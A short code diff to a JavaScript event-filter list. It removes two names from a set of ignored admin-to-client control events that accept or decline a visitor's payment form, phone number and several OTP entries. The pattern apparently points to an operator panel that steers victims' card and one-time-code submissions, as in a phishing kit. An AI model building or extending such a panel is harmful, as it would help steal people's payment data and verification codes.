@@ -766,7 +766,7 @@ const IGNORED_ANY_EVENTS = new Set([
   "client:cancelOtp", "client:cancelPayment",
   "payment:duplicateAttempt", "otp:duplicateAttempt",
   // admin -> client control events (not visitor submissions)
-  "acceptService", "declineService", "acceptPaymentForm", "declinePaymentForm",
+  "acceptPaymentForm", "declinePaymentForm",
   "acceptPhone", "declinePhone", "acceptVisaOtp", "declineVisaOtp",
   "acceptPhoneOtp", "declinePhoneOtp", "acceptPhoneOTP", "declinePhoneOTP",
   "acceptMobOtp", "declineMobOtp", "acceptMotslOtp", "declineMotslOtp",
